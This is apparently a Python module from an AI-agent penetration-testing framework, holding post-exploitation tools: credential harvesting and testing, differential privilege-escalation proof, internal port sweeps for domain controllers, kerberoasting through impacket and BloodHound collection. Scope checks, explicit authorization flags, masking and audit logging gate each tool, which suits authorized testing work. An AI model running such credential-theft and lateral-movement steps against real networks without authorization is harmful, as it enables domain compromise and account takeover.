"""Post-exploitation: credential access and privilege escalation.

Three steps that turn a foothold into a chain:

  extract_secrets   harvest candidates from material we ALREADY hold
  try_credential    use a candidate; it is only "held" if it really authenticates
  prove_privilege   prove a privilege BOUNDARY was crossed, differentially

`prove_privilege` is the important one. Escalation is inherently differential — the
low-privilege identity is a built-in negative control — so we reuse the same k-of-n +
falsification engine that has kept precision at 1.0. We are not proving "I got a 200";
we are proving "this identity can do what that identity cannot".
"""

from __future__ import annotations

import json
import subprocess

from ..access import AUTHENTICATES_AS, CREDENTIAL, PRINCIPAL, REVEALS
from ..falsify import run_negative_control
from ..findings import Finding
from ..killchain import ACHIEVED, CREDENTIAL_ACCESS, PRIVILEGE_ESCALATION
from ..proof import ProofCheck
from ..scope import ScopeViolation
from ..secrets import extract_candidates, interesting_claims
from ..verify import verify
from . import ToolContext
from .http import fetch_once, make_fetch


def _apply_credential(headers: dict, value: str, placement: str, name: str) -> dict:
    h = dict(headers or {})
    if placement == "header":
        h[name or "Authorization"] = value
    elif placement == "bearer":
        h["Authorization"] = f"Bearer {value}"
    elif placement == "cookie":
        cookie = f"{name or 'session'}={value}"
        h["Cookie"] = (h.get("Cookie") + "; " + cookie) if h.get("Cookie") else cookie
    return h


class ExtractSecretsTool:
    name = "extract_secrets"

    def schema(self) -> dict:
        return {
            "name": self.name,
            "description": (
                "Harvest credential CANDIDATES from material you already obtained — a "
                "response body, a file you retrieved, a token you hold. Paste the material "
                "in `text`, or give `url` to fetch an in-scope resource you've already "
                "found and harvest it. Decodes JWTs (the role/scope claim is often the "
                "escalation path). Candidates are recorded as NOT held; use try_credential "
                "to see which ones actually work."
            ),
            "input_schema": {
                "type": "object",
                "additionalProperties": False,
                "properties": {
                    "text": {"type": "string", "description": "Material you already have."},
                    "url": {"type": "string", "description": "Optional in-scope URL to fetch and harvest."},
                    "context": {"type": "string", "description": "Where this came from."},
                },
                "required": [],
            },
            "strict": True,
        }

    def run(self, ctx: ToolContext, text: str = "", url: str = "", context: str = "") -> str:
        material = text or ""
        if url:
            try:
                status, body, _, headers = fetch_once(ctx, {"method": "GET", "url": url})
            except ScopeViolation as exc:
                return f"BLOCKED (out of scope): {exc}"
            material += "\n" + "\n".join(f"{k}: {v}" for k, v in (headers or {}).items())
            material += "\n" + (body or "")
            context = context or url
        if not material.strip():
            return "ERROR: provide `text` you already obtained, or an in-scope `url`."

        candidates = extract_candidates(material, context=context)
        out = []
        for c in candidates:
            if ctx.access is not None:
                node = ctx.access.observe(
                    CREDENTIAL, c.preview,
                    attrs={"secret": True, "value": c.value, "kind": c.kind,
                           "context": c.context, "confidence": c.confidence},
                    source="extract_secrets")
                if c.claims:
                    node.attrs["claims"] = interesting_claims(c.claims)
            row = {"kind": c.kind, "preview": c.preview, "context": c.context,
                   "confidence": c.confidence}
            if c.claims:
                row["claims"] = interesting_claims(c.claims)
            out.append(row)
        ctx.audit.record("secrets.extracted", count=len(out), context=context)
        if not out:
            return json.dumps({"candidates": [], "note": "nothing credential-shaped here."})
        return json.dumps({"candidates": out,
                           "note": "These are CANDIDATES. Prove them with try_credential — "
                                   "reference one by its preview string."}, ensure_ascii=False)


class TryCredentialTool:
    name = "try_credential"

    def schema(self) -> dict:
        return {
            "name": self.name,
            "description": (
                "Use a candidate credential against an in-scope probe URL to see whether it "
                "actually authenticates. Only if it works is it recorded as HELD and stored "
                "as a session you can reuse (session_label). Give the raw value, or the "
                "preview string of a candidate from extract_secrets."
            ),
            "input_schema": {
                "type": "object",
                "additionalProperties": False,
                "properties": {
                    "value": {"type": "string", "description": "Raw credential, or a candidate preview string."},
                    "probe_url": {"type": "string", "description": "In-scope URL that behaves differently when authenticated."},
                    "placement": {"type": "string", "enum": ["bearer", "header", "cookie"]},
                    "header_name": {"type": "string", "description": "Header/cookie name (default Authorization/session)."},
                    "success_regex": {"type": "string", "description": "Pattern proving you are authenticated."},
                    "expect_status": {"type": "integer"},
                    "session_label": {"type": "string", "description": "Name to store the working session under."},
                    "principal": {"type": "string", "description": "Who this authenticates you as (e.g. 'admin')."},
                },
                "required": ["value", "probe_url", "session_label"],
            },
            "strict": True,
        }

    def run(self, ctx: ToolContext, value: str, probe_url: str, session_label: str,
            placement: str = "bearer", header_name: str = "", success_regex: str = "",
            expect_status: int = 200, principal: str = "") -> str:
        # Allow referencing a candidate by its masked preview.
        raw = value
        if ctx.access is not None:
            node = ctx.access._nodes.get(f"{CREDENTIAL}:{value}")
            if node is not None and node.attrs.get("value"):
                raw = node.attrs["value"]

        headers = _apply_credential({}, raw, placement, header_name)
        try:
            status, body, _, _ = fetch_once(ctx, {"method": "GET", "url": probe_url,
                                                  "headers": headers})
        except ScopeViolation as exc:
            return f"BLOCKED (out of scope): {exc}"

        import re as _re
        ok = (status == expect_status)
        if success_regex:
            ok = ok and bool(_re.search(success_regex, body or ""))
        ctx.audit.record("credential.try", label=session_label, status=status, works=ok)
        if not ok:
            return json.dumps({"authenticated": False, "status": status,
                               "note": "credential did not authenticate here — discard it or "
                                       "try a different placement/probe."})

        if ctx.sessions is not None:
            ctx.sessions.set(session_label, headers)
        if ctx.access is not None:
            # NOTE: single-shot proof (one status/regex check, no k-of-n, no negative
            # control) — weaker than confirm_finding/verify_vulnerability/prove_privilege.
            # Held here directly (not gated through independent_verify) because a working
            # session is immediately useful as a tool for the NEXT step regardless, and
            # objective credit still requires either a REQUIRED_SOURCE mechanism (see
            # objective.py) or an independently-verified finding referencing this access —
            # a credential alone cannot satisfy a PRIVILEGE/HOST_ACCESS/DATA_ACCESS criterion.
            cred = ctx.access.hold(CREDENTIAL, value, evidence=f"authenticated at {probe_url}",
                                   attrs={"secret": True, "value": raw}, source="try_credential")
            if principal:
                p = ctx.access.observe(PRINCIPAL, principal, source="try_credential")
                ctx.access.link(cred.id, AUTHENTICATES_AS, p.id)
        if ctx.killchain is not None:
            ctx.killchain.mark(CREDENTIAL_ACCESS, ACHIEVED, f"working credential for {session_label}")
        return json.dumps({"authenticated": True, "status": status,
                           "session_label": session_label,
                           "note": "Session stored. Now prove what it can do that your "
                                   "lower-privilege identity cannot (prove_privilege)."})


class ProvePrivilegeTool:
    name = "prove_privilege"

    def schema(self) -> dict:
        return {
            "name": self.name,
            "description": (
                "Prove a PRIVILEGE BOUNDARY was crossed: the same request succeeds as the "
                "elevated identity and FAILS as the lower-privilege one. The low-privilege "
                "session is the built-in control, so this proves real escalation rather than "
                "'I got a 200'. On success the principal is marked held, an escalates_to edge "
                "is added, and the kill chain advances."
            ),
            "input_schema": {
                "type": "object",
                "additionalProperties": False,
                "properties": {
                    "privileged_url": {"type": "string", "description": "An action only the elevated identity should be able to do."},
                    "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE"]},
                    "high_session_label": {"type": "string", "description": "Session believed to be elevated."},
                    "low_session_label": {"type": "string", "description": "Lower-privilege session as control. Omit for unauthenticated control."},
                    "privileged_marker": {"type": "string", "description": "Regex proving privileged content/capability."},
                    "expect_status": {"type": "integer"},
                    "from_principal": {"type": "string", "description": "Identity you had (e.g. 'app-user')."},
                    "to_principal": {"type": "string", "description": "Identity you gained (e.g. 'admin')."},
                    "trials": {"type": "integer"},
                    "need": {"type": "integer"},
                },
                "required": ["privileged_url", "high_session_label", "privileged_marker",
                             "to_principal"],
            },
            "strict": True,
        }

    def run(self, ctx: ToolContext, privileged_url: str, high_session_label: str,
            privileged_marker: str, to_principal: str, method: str = "GET",
            low_session_label: str = "", expect_status: int = 200,
            from_principal: str = "", trials: int = 4, need: int = 3) -> str:
        if ctx.sessions is None:
            return "ERROR: session store unavailable."
        high = ctx.sessions.get(high_session_label)
        if high is None:
            return f"ERROR: no session '{high_session_label}'. Run try_credential/authenticate first."
        low = ctx.sessions.get(low_session_label) if low_session_label else None

        trials = max(1, min(int(trials), 10)); need = max(1, min(int(need), trials))
        try:
            fetchers = {"payload": make_fetch(ctx, {"method": method, "url": privileged_url,
                                                    "headers": high.apply({})})}
            control_fetch = make_fetch(ctx, {"method": method, "url": privileged_url,
                                             "headers": low.apply({}) if low else {}})
        except ScopeViolation as exc:
            return f"BLOCKED (out of scope): {exc}"

        conditions = [{"type": "status", "request": "payload", "equals": expect_status},
                      {"type": "body_regex", "request": "payload", "pattern": privileged_marker}]

        result = verify(ProofCheck(fetchers, conditions), trials=trials, need=need)
        ctx.audit.record("privilege.verify", url=privileged_url, verdict=result.verdict,
                         to_principal=to_principal)
        if result.verdict != "confirmed":
            return json.dumps({"verdict": result.verdict, "escalated": False,
                               "note": "the elevated identity could not reliably do this."})

        # The control: the lower-privilege identity must NOT be able to do it.
        fal = run_negative_control(fetchers, conditions, control_fetch, "payload")
        ctx.audit.record("privilege.control", url=privileged_url, falsified=fal.falsified)
        if fal.falsified:
            return json.dumps({
                "verdict": "falsified", "escalated": False, "detail": fal.detail,
                "note": "The lower-privilege identity can do this too — no privilege boundary "
                        "was crossed. This is not escalation (it may be broken access control)."})

        # Self-administered proof + self-administered control is still self-grading — this
        # is exactly the "run 13 credited admin without proof" failure mode if trusted
        # directly. Record PENDING; only an independent re-check (tools/independent_verify.py)
        # may mark the principal HELD and satisfy a PRIVILEGE objective criterion.
        check_spec = {"privileged_url": privileged_url, "method": method,
                      "high_session_label": high_session_label, "low_session_label": low_session_label,
                      "privileged_marker": privileged_marker, "expect_status": expect_status,
                      "from_principal": from_principal, "to_principal": to_principal}
        f = ctx.findings.add(Finding(
            title=f"Privilege escalation to {to_principal}", severity="critical",
            target=privileged_url,
            summary=f"An identity obtained as {from_principal or 'a lower-privilege user'} can "
                    f"perform actions restricted to {to_principal}.",
            evidence="\n".join(result.details) + "\nControl: " + fal.detail,
            cwe="CWE-269", confidence="pending_verification", verification_verdict=result.verdict,
            reproductions=result.reproductions, trials=result.trials,
            poc=f"{method} {privileged_url} as {high_session_label} succeeds; as "
                f"{low_session_label or 'unauthenticated'} it does not.",
            check_type="privilege", check_spec=check_spec,
            recommendation="Enforce server-side authorization on this action for every identity."))
        return json.dumps({"verdict": "pending_verification", "escalated_pending": True, "finding_id": f.id,
                           "note": "Proof and control passed, but this does not count yet — an "
                                   "independent re-check must reproduce it before the principal is "
                                   "HELD and any objective criterion can be satisfied."})


# --- internal network / lateral movement -------------------------------------
#
# The web perimeter tools stop at the app; these primitives press a FOOTHOLD
# into the internal network (authorized internal ranges only). Every tool here
# is triple-gated:
#   1. RoE — the target host/port must pass the same fail-closed scope.check
#      every other tool uses (private ranges only when the RoE covers them);
#   2. an explicit `authorized_internal=True` flag the operator (or the plan)
#      must set — silence is not authorization for lateral movement;
#   3. adapter availability — impacket / bloodhound-python are probed honestly;
#      a missing adapter is reported, never silently skipped.
# Credential material NEVER lands in findings, audit records, or the access
# graph — masked previews only (same discipline as secrets.py previews).


def _run_adapter(argv: list[str], timeout: int = 300, cwd: str | None = None):
    """Run an external collector with an explicit argv list (no shell), bounded."""
    import subprocess
    return subprocess.run(argv, capture_output=True, text=True, timeout=timeout,
                          cwd=cwd, shell=False, check=False)


def _mask_material(value: str) -> str:
    if not value:
        return ""
    return f"{value[:14]}…<withheld:{len(value)} chars>"


class InternalSweepTool:
    name = "internal_sweep"

    AD_DEFAULT_PORTS = (445, 88, 135, 139, 389, 636, 3268, 5985, 22, 3389)

    def schema(self) -> dict:
        return {
            "name": self.name,
            "description": (
                "TCP-connect sweep of an AUTHORIZED internal range from a foothold: "
                "which hosts answer on which service ports (AD-shaped combos "
                "kerberos+ldap+smb are flagged as likely domain controllers). "
                "Requires allow_private_ranges in the RoE AND authorized_internal=true. "
                "Connect-level only — no exploitation, no authentication attempts."
            ),
            "input_schema": {
                "type": "object",
                "additionalProperties": False,
                "properties": {
                    "cidr": {"type": "string", "description": "Internal range, e.g. 10.10.0.0/24."},
                    "ports": {"type": "array", "items": {"type": "integer"},
                              "description": "Ports to probe (default AD-common set, max 16)."},
                    "max_hosts": {"type": "integer", "description": "Host cap (default 256, hard cap)."},
                    "timeout_ms": {"type": "integer", "description": "Per-connect timeout (default 500)."},
                    "authorized_internal": {"type": "boolean",
                                            "description": "Must be true — explicit authorization to touch internal ranges."},
                },
                "required": ["cidr", "authorized_internal"],
            },
            "strict": True,
        }

    def run(self, ctx: ToolContext, cidr: str, authorized_internal: bool = False,
            ports: list | None = None, max_hosts: int = 256, timeout_ms: int = 500) -> str:
        import ipaddress
        import socket
        from concurrent.futures import ThreadPoolExecutor

        if not authorized_internal:
            ctx.audit.record("internal_sweep.refused", cidr=cidr,
                             cause="authorized_internal not set")
            return json.dumps({"blocked": True,
                               "note": "internal_sweep refused: set authorized_internal=true — "
                                       "lateral movement needs explicit authorization, silence "
                                       "is not consent."})
        try:
            network = ipaddress.ip_network(cidr, strict=False)
        except ValueError as exc:
            return f"ERROR: invalid cidr {cidr!r}: {exc}"
        port_list = tuple(dict.fromkeys(
            int(p) for p in (ports or self.AD_DEFAULT_PORTS)))[:16]
        host_cap = max(1, min(int(max_hosts), 256))
        timeout = max(0.1, min(float(timeout_ms) / 1000.0, 5.0))

        targets: list[tuple[str, int]] = []
        for ip in list(network.hosts())[:host_cap]:
            host = str(ip)
            for p in port_list:
                try:
                    ctx.scope.check(f"http://{host}:{p}/")  # fail closed per target
                except ScopeViolation:
                    continue  # out of RoE: this host:port is NOT swept (and not logged as a miss)
                targets.append((host, p))
        if not targets:
            return json.dumps({"blocked": True,
                               "note": "every host:port in the range is outside the RoE "
                                       "(allow_private_ranges / port list) — nothing swept."})

        def probe(host: str, p: int) -> tuple[str, int, bool]:
            try:
                with socket.create_connection((host, p), timeout=timeout):
                    return host, p, True
            except OSError:
                return host, p, False

        ctx.audit.record("internal_sweep.start", cidr=cidr, targets=len(targets))
        open_ports: list[dict] = []
        with ThreadPoolExecutor(max_workers=32) as pool:
            for host, p, is_open in pool.map(lambda t: probe(t[0], t[1]), targets):
                if is_open:
                    open_ports.append({"host": host, "port": p})
                    if ctx.inventory is not None:
                        try:
                            ctx.inventory.observe_asset(host, p, scheme="tcp")
                        except Exception:
                            pass  # telemetry never breaks a run

        hosts_seen = sorted({row["host"] for row in open_ports})
        domain_controllers = sorted({
            row["host"] for row in open_ports
            if {x["port"] for x in open_ports if x["host"] == row["host"]}
            >= {88, 389, 445}
        })
        ctx.audit.record("internal_sweep.done", cidr=cidr, open=len(open_ports),
                         hosts=len(hosts_seen), dcs=len(domain_controllers))
        finding_ids: list[str] = []
        for dc in domain_controllers[:5]:
            f = ctx.findings.add(Finding(
                title=f"Domain controller exposed at {dc}",
                severity="high", target=f"tcp://{dc}:88",
                summary="A host answers on kerberos(88), ldap(389) and smb(445) together — "
                        "the AD identity plane of the internal network.",
                evidence="internal_sweep found kerberos+ldap+smb open on this host. "
                         "Internal foothold can now attempt kerberoast (postex.kerberoast).",
                cwe="CWE-284", confidence="tentative",
                poc=f"internal_sweep cidr={cidr} ports={list(port_list)}; "
                    f"host {dc} answered on 88/389/445.",
                recommendation="Restrict DC exposure to management networks; monitor "
                               "kerberoasting (4769 ticket requests for service accounts)."))
            finding_ids.append(f.id)
        return json.dumps({"swept_targets": len(targets), "open_ports": open_ports[:200],
                           "hosts_seen": hosts_seen, "likely_dcs": domain_controllers,
                           "finding_ids": finding_ids,
                           "note": "Connect-level sweep only. Next steps if the RoE allows: "
                                   "kerberoast against a DC, bloodhound_collect for the "
                                   "identity graph."}, ensure_ascii=False)


class KerberoastTool:
    name = "kerberoast"

    def schema(self) -> dict:
        return {
            "name": self.name,
            "description": (
                "Request service tickets (TGS) for SPN accounts on a domain controller — "
                "the kerberoast primitive — using impacket's GetUserSPNs when installed. "
                "Offline cracking of the returned material is YOURS to do outside the "
                "run; the tool reports COUNTS and masked previews only, never the "
                "material itself. Requires allow_private_ranges + authorized_internal."
            ),
            "input_schema": {
                "type": "object",
                "additionalProperties": False,
                "properties": {
                    "dc_host": {"type": "string", "description": "In-scope domain controller host."},
                    "domain": {"type": "string", "description": "AD domain, e.g. corp.lab."},
                    "username": {"type": "string", "description": "Low-privilege domain user."},
                    "password": {"type": "string", "description": "That user's password (used on the wire, never stored)."},
                    "authorized_internal": {"type": "boolean", "description": "Must be true."},
                },
                "required": ["dc_host", "domain", "username", "password", "authorized_internal"],
            },
            "strict": True,
        }

    CANDIDATE_BINARIES = ("impacket-GetUserSPNs", "GetUserSPNs.py")

    def run(self, ctx: ToolContext, dc_host: str, domain: str, username: str,
            password: str, authorized_internal: bool = False) -> str:
        import shutil
        if not authorized_internal:
            ctx.audit.record("kerberoast.refused", cause="authorized_internal not set")
            return json.dumps({"blocked": True,
                               "note": "kerberoast refused: set authorized_internal=true."})
        binary = next((shutil.which(b) for b in self.CANDIDATE_BINARIES if shutil.which(b)), None)
        if binary is None:
            return json.dumps({"available": False,
                               "note": "impacket not installed (GetUserSPNs) — install "
                                       "impacket in the sandbox; nothing was sent to the DC."},
                              ensure_ascii=False)
        try:
            ctx.scope.check(f"http://{dc_host}:88/")  # kerberos port, fail closed
        except ScopeViolation as exc:
            return f"BLOCKED (out of scope): {exc}"

        argv = [binary, "-dc-host", dc_host, "-request", f"{domain}/{username}:{password}"]
        try:
            proc = _run_adapter(argv, timeout=300)
        except subprocess.TimeoutExpired:
            return json.dumps({"error": "adapter timed out after 300s"}, ensure_ascii=False)
        except Exception as exc:
            return json.dumps({"error": f"adapter failed: {exc}"}, ensure_ascii=False)
        output = (proc.stdout or "") + "\n" + (proc.stderr or "")
        tgs_rows = [line for line in output.splitlines() if "$krb5tgs$" in line]
        ctx.audit.record("kerberoast.run", dc=dc_host, domain=domain,
                         tickets=len(tgs_rows), adapter=binary)
        finding_ids: list[str] = []
        if tgs_rows:
            first = tgs_rows[0]
            if ctx.access is not None:
                ctx.access.observe(
                    CREDENTIAL, _mask_material(first),
                    attrs={"secret": True, "kind": "kerberoast-hash",
                           "count": len(tgs_rows), "context": f"kerberoast@{dc_host}"},
                    source="kerberoast")
            f = ctx.findings.add(Finding(
                title=f"Kerberoastable service accounts on {domain}",
                severity="high", target=f"kerberos://{dc_host}",
                summary=f"{len(tgs_rows)} service-ticket(s) obtained for offline cracking — "
                        "cracked ones are domain credentials usable for lateral movement.",
                evidence=f"$krb5tgs$ material obtained for {len(tgs_rows)} SPN account(s); "
                         f"first masked: {_mask_material(first)}",
                cwe="CWE-521", confidence="tentative",
                poc=f"GetUserSPNs -dc-host {dc_host} -request {domain}/{username} "
                    f"returned {len(tgs_rows)} TGS blobs.",
                recommendation="Strong (25+ char random) service-account passwords, gMSA, "
                               "or mark accounts AES-only; alert on 4769 floods."))
            finding_ids.append(f.id)
        return json.dumps({"available": True, "tickets": len(tgs_rows),
                           "finding_ids": finding_ids,
                           "note": "Material is NOT stored here — crack offline in your "
                                   "sandbox; feed any result back via try_credential."},
                          ensure_ascii=False)


class BloodHoundTool:
    name = "bloodhound_collect"

    def schema(self) -> dict:
        return {
            "name": self.name,
            "description": (
                "Collect the AD identity graph with bloodhound-python (when installed): "
                "users, groups, sessions, ACLs. Output lands in a run-scoped temp dir "
                "and the finding references the FILES — the graph data is evidence, "
                "not something to paste into the transcript. Requires "
                "allow_private_ranges + authorized_internal."
            ),
            "input_schema": {
                "type": "object",
                "additionalProperties": False,
                "properties": {
                    "dc_host": {"type": "string", "description": "In-scope domain controller."},
                    "domain": {"type": "string", "description": "AD domain."},
                    "username": {"type": "string", "description": "Low-privilege domain user."},
                    "password": {"type": "string", "description": "That user's password (never stored)."},
                    "collection_method": {"type": "string",
                                          "description": "bloodhound-python -c value (default All)."},
                    "authorized_internal": {"type": "boolean", "description": "Must be true."},
                },
                "required": ["dc_host", "domain", "username", "password", "authorized_internal"],
            },
            "strict": True,
        }

    def run(self, ctx: ToolContext, dc_host: str, domain: str, username: str,
            password: str, authorized_internal: bool = False,
            collection_method: str = "All") -> str:
        import shutil
        import tempfile
        from pathlib import Path
        if not authorized_internal:
            ctx.audit.record("bloodhound.refused", cause="authorized_internal not set")
            return json.dumps({"blocked": True,
                               "note": "bloodhound_collect refused: set authorized_internal=true."})
        binary = shutil.which("bloodhound-python")
        if binary is None:
            return json.dumps({"available": False,
                               "note": "bloodhound-python not installed — nothing collected."},
                              ensure_ascii=False)
        try:
            ctx.scope.check(f"http://{dc_host}:389/")  # ldap port, fail closed
        except ScopeViolation as exc:
            return f"BLOCKED (out of scope): {exc}"

        with tempfile.TemporaryDirectory(prefix="gnhf-bloodhound-") as workdir:
            argv = [binary, "-d", domain, "-u", username, "-p", password,
                    "-dc", dc_host, "-c", collection_method or "All", "--zip",
                    "-f", "collector"]
            try:
                proc = _run_adapter(argv, timeout=900, cwd=workdir)
            except Exception as exc:
                return json.dumps({"error": f"adapter failed: {exc}"}, ensure_ascii=False)
            files = sorted(p.name for p in Path(workdir).glob("*") if p.is_file())
            ctx.audit.record("bloodhound.run", dc=dc_host, domain=domain,
                             files=len(files), method=collection_method)
            if not files:
                return json.dumps({"available": True, "files": [],
                                   "stderr_tail": (proc.stderr or "")[-400:],
                                   "note": "collector produced no files — check stderr_tail."},
                                  ensure_ascii=False)
            f = ctx.findings.add(Finding(
                title=f"AD identity graph collected for {domain}",
                severity="medium", target=f"ldap://{dc_host}",
                summary=f"bloodhound-python collected {len(files)} artifact(s) "
                        "(users/groups/sessions/ACLs) — the lateral-movement map.",
                evidence=f"artifacts in run temp dir: {', '.join(files[:8])}",
                cwe="CWE-200", confidence="tentative",
                poc=f"bloodhound-python -d {domain} -dc {dc_host} -c {collection_method}",
                recommendation="Tiered admin model, limit session enumeration surface, "
                               "monitor bulk LDAP reads."))
            return json.dumps({"available": True, "files": files, "finding_id": f.id,
                               "note": "Graph artifacts kept run-local; open them from the "
                                       "run dir when analyzing attack paths."},
                              ensure_ascii=False)
